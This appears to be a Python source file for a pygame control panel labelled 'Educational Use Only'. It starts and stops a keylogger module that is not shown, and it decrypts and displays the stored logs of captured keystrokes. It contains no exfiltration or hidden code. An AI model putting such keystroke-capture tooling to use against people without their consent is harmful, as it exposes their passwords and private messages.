import pygame
import sys
import os
from src.keylogger import KeyLogger
from src.utils import load_config, decrypt_data, get_app_settings
import glob

# Initialize pygame
pygame.init()

# Get app settings from environment
app_settings = get_app_settings()

# Screen dimensions
WIDTH, HEIGHT = app_settings['ui_width'], app_settings['ui_height']
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption(f"{app_settings['app_name']} - Educational Use Only")

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
GREEN = (0, 255, 0)
RED = (255, 0, 0)
GRAY = (200, 200, 200)
LIGHT_BLUE = (173, 216, 230)

# Fonts
font = pygame.font.SysFont('Arial', 20)
small_font = pygame.font.SysFont('Arial', 14)

class KeyloggerApp:
    def __init__(self):
        self.keylogger = KeyLogger()
        self.status = "STOPPED"
        self.log_content = "Logs will appear here when you click 'View Logs'"
        self.view_logs_mode = False
        
    def toggle_logging(self):
        if self.status == "STOPPED":
            if self.keylogger.start_logging():
                self.status = "RUNNING"
        else:
            if self.keylogger.stop_logging():
                self.status = "STOPPED"
    
    def view_logs(self):
        """Display recent log content (decrypted)"""
        self.log_content = "Loading logs..."
        
        try:
            config = load_config()
            log_dir = config['log_directory']
            
            if not os.path.exists(log_dir):
                self.log_content = "Log directory doesn't exist yet."
                return
                
            # Find all log files
            log_files = glob.glob(os.path.join(log_dir, f"*{config['log_extension']}"))
            if not log_files:
                self.log_content = "No log files found. Start logging first."
                return
            
            # Get the most recent log file
            latest_file = max(log_files, key=os.path.getctime)
            print(f"Reading log file: {latest_file}")
            
            # Read and decrypt the log file
            decrypted_content = ""
            with open(latest_file, 'rb') as f:
                for line in f:
                    if line.strip():  # Skip empty lines
                        try:
                            decrypted_line = decrypt_data(line.strip(), config['encryption_key'])
                            decrypted_content += decrypted_line + "\n"
                        except Exception as e:
                            decrypted_content += f"[Decryption error: {str(e)}]\n"
            
            if decrypted_content:
                self.log_content = decrypted_content
                print(f"Successfully loaded {len(decrypted_content)} characters from log")
            else:
                self.log_content = "Log file is empty. Try typing something while logging is active."
                
        except Exception as e:
            self.log_content = f"Error reading logs: {str(e)}"
            print(f"Error in view_logs: {e}")
    
    def run(self):
        clock = pygame.time.Clock()
        running = True
        
        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    if self.status == "RUNNING":
                        self.keylogger.stop_logging()
                    running = False
                    pygame.quit()
                    sys.exit()
                
                if event.type == pygame.MOUSEBUTTONDOWN:
                    mouse_pos = pygame.mouse.get_pos()
                    
                    # Toggle logging button
                    if 150 <= mouse_pos[0] <= 350 and 70 <= mouse_pos[1] <= 110:
                        self.toggle_logging()
                    
                    # View logs button
                    if 150 <= mouse_pos[0] <= 350 and 130 <= mouse_pos[1] <= 170:
                        self.view_logs_mode = True
                        self.view_logs()
                    
                    # Back button (when viewing logs)
                    if self.view_logs_mode and 20 <= mouse_pos[0] <= 100 and HEIGHT-40 <= mouse_pos[1] <= HEIGHT-10:
                        self.view_logs_mode = False
            
            # Draw UI
            screen.fill(WHITE)
            
            if not self.view_logs_mode:
                # Main screen
                title = font.render(f"{app_settings['app_name']} - Educational Use Only", True, BLACK)
                screen.blit(title, (WIDTH//2 - title.get_width()//2, 10))
                
                # Status
                status_text = f"Status: {self.status}"
                status_color = GREEN if self.status == "RUNNING" else RED
                status_surf = font.render(status_text, True, status_color)
                screen.blit(status_surf, (WIDTH//2 - status_surf.get_width()//2, 40))
                
                # Toggle button
                pygame.draw.rect(screen, LIGHT_BLUE, (150, 70, 200, 40))
                toggle_text = font.render("Start/Stop Logging", True, BLACK)
                screen.blit(toggle_text, (150 + 100 - toggle_text.get_width()//2, 70 + 20 - toggle_text.get_height()//2))
                
                # View logs button
                pygame.draw.rect(screen, LIGHT_BLUE, (150, 130, 200, 40))
                log_text = font.render("View Logs", True, BLACK)
                screen.blit(log_text, (150 + 100 - log_text.get_width()//2, 130 + 20 - log_text.get_height()//2))
                
                # Instructions
                instructions = small_font.render("Click 'View Logs' to see captured keystrokes", True, BLACK)
                screen.blit(instructions, (WIDTH//2 - instructions.get_width()//2, HEIGHT - 60))
                
            else:
                # Log viewing screen
                title = font.render("Captured Keystrokes", True, BLACK)
                screen.blit(title, (WIDTH//2 - title.get_width()//2, 10))
                
                # Log content area
                pygame.draw.rect(screen, WHITE, (20, 40, WIDTH-40, HEIGHT-80))
                pygame.draw.rect(screen, BLACK, (20, 40, WIDTH-40, HEIGHT-80), 2)
                
                # Render log content with word wrapping
                y_offset = 45
                lines = self.log_content.split('\n')
                for line in lines:
                    # Handle long lines by wrapping them
                    if len(line) > 80:
                        wrapped_lines = [line[i:i+80] for i in range(0, len(line), 80)]
                        for wrapped_line in wrapped_lines:
                            if y_offset < HEIGHT - 60:
                                line_surf = small_font.render(wrapped_line, True, BLACK)
                                screen.blit(line_surf, (25, y_offset))
                                y_offset += 16
                    else:
                        if y_offset < HEIGHT - 60:
                            line_surf = small_font.render(line, True, BLACK)
                            screen.blit(line_surf, (25, y_offset))
                            y_offset += 16
                
                # Back button
                pygame.draw.rect(screen, LIGHT_BLUE, (20, HEIGHT-40, 80, 30))
                back_text = small_font.render("Back", True, BLACK)
                screen.blit(back_text, (20 + 40 - back_text.get_width()//2, HEIGHT-40 + 15 - back_text.get_height()//2))
            
            pygame.display.flip()
            clock.tick(app_settings['ui_refresh_rate'])

if __name__ == "__main__":
    app = KeyloggerApp()
    app.run()